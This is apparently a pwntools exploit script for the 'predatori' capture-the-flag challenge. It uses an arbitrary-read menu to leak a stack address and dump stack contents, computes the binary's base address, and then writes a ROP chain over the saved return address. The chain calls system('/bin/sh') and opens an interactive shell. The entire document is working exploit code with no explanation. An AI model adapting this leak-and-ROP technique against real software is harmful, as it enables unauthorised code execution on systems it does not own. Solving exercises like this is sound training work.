from pwn import *

context.binary = elf = ELF('./predatori')
context.terminal = ('kgx', '-e')

if args.REMOTE:
    r = remote('predatori.challs.olicyber.it', 15006)
elif args.GDB:
    r = gdb.debug('./predatori', ''' 
                   b www   
                   c
    ''')
else:
    r = process('./predatori')

r.recvuntil(b'Esci')
r.sendline(b'1')

r.recvuntil(b'Indirizzo: ')
r.send(b'\x00')

r.recvline()
r.recvline()

addr = r.recvuntil(b'1)')[:-2]
addr = u64(addr.ljust(8))

if hex(addr).startswith('0x7f'):
    log.success(f'leaked stack address: {hex(addr)}')
else:
    log.failure('leak failed, exiting...')
    exit()

received = []
for i in range(40):
    r.recvuntil(b'Esci')
    r.sendline(b'1')

    r.recvuntil(b'Indirizzo: ')
    r.send(p64(addr + i*8))
    r.recvuntil(b'...\n')
    received.append((r.recvuntil(b'1)')[:-2], addr + i*8))
    print(received[-1])

print('END')

# find main address and where the return address is stored in the stack
main_addr, ret_addr = 0, 0
for i in range(len(received)):
    if b'flag' in received[i][0]:
        main_addr = u64(received[i-3][0].ljust(8)) - 267
        ret_addr = received[i-3][1] + 0x60
        break

if main_addr != 0:
    log.success(f'main is at: {hex(main_addr)}')
    log.success(f'ret addr is at: {hex(ret_addr)}')
    elf.address = main_addr - elf.symbols['main']
    log.info(f'elf base: {hex(elf.address)}')
else:
    log.failure('flag1 not found, exiting...')
    exit()

# find /bin/sh address
bin_sh = elf.search(b'/bin/sh').__next__()
log.success(f'/bin/sh is at: {hex(bin_sh)}')

# rop chain
r.sendafter(b'Esci\n', b'2')
r.sendafter(b'Indirizzo: ', p64(ret_addr))
r.sendafter(b'bytes: ', b'8')
r.sendafter(b'?', p64(elf.address + 0x4b59f)) # 0x4b59f -> pop rax; pop rdi; call rax;

r.sendafter(b'Esci\n', b'2')
r.sendafter(b'Indirizzo: ', p64(ret_addr + 0x8))
r.sendafter(b'bytes: ', b'8')
r.sendafter(b'?', p64(elf.sym['system'])) # system -> rax;

r.sendafter(b'Esci\n', b'2')
r.sendafter(b'Indirizzo: ', p64(ret_addr + 0x10))
r.sendafter(b'bytes: ', b'8')
r.sendafter(b'?', p64(bin_sh)) # address of '/bin/sh' -> rdi;

r.interactive()
